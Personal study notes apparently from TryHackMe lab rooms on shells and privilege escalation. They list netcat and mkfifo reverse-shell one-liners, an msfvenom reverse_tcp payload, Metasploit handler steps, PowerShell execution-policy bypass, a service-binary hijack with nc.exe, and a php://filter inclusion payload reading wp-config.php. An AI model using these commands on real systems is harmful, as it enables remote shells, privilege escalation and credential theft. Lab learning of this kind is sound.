# R

* Remember for web/general/security
* .todo: metasploit dns
* web general | terminology | URL may have to be moved

<hr>

## Prev esc

https://tryhackme.com/room/linprivesc
=> hint/notes
=> network

* https://tryhackme.com/room/introtoshells
* If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
* nc ip port -e /bin/bash (rev shell)
* nc -lvnp port -e /bin/bash (bind shell)
* this is not included in most versions of netcat
* `mkfifo /tmp/f; nc XXX < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` (listener for our wxw shell)
* https://tryhackme.com/room/introtoshells (Windows)
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
* `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
* staged reverse shell payloads and stageless
* exploit/multi/handler
  * It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads
  * `set PAYLOAD X`
  * `exploit -j`
* socat is a sort of ncat+more, but not installed by default, and harder to learn.
  * Read again the section: https://tryhackme.com/room/introtoshells
  * Can encrypt, may bypass an IDS: https://tryhackme.com/room/introtoshells
* Socat: transfer the socat binary
* Reverse shells/... note lasty

<hr>

## Overconfidence

--- https://tryhackme.com/room/steelmountain

* use meterpreter upload to upload the winPEAS
* `upload /tmp/xxx`
* `shell`
* `.\winPEASany_ofs.exe`
* `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
* `powershell -ep bypass -c ". .\PowerUp.ps1;"`
* `https://github.com/itm4n/PrivescCheck#metasploit-timeout`
* `load powershell`
* `powershell_shell`
* `. .\PowerUp.ps1; Invoke-AllChecks`
* `. .\PowerUp.ps1` `PS > Invoke-AllChecks`
* https://www.joesandbox.com/#windows
* https://github.com/EgeBalci/sgn
* sc qc XXX
* sc stop XXX
* `Write-ServiceBinary -Name 'XXX' -Path ".\nc.exe"`
* sc start XXX
* `powershell -c wget "URL" -outfile "OUTPUT"`
* like OTX: https://cyware.com/

--- https://tryhackme.com/room/allinonemj

* Kali right-arrow
* Test: `wpscan --url http://10.10.162.222/wordpress/ --detection-mode aggressive`
* `php://filter/convert.base64-encode/resource=../../../../../wp-config.php` (file inclusion)
* not finished aza.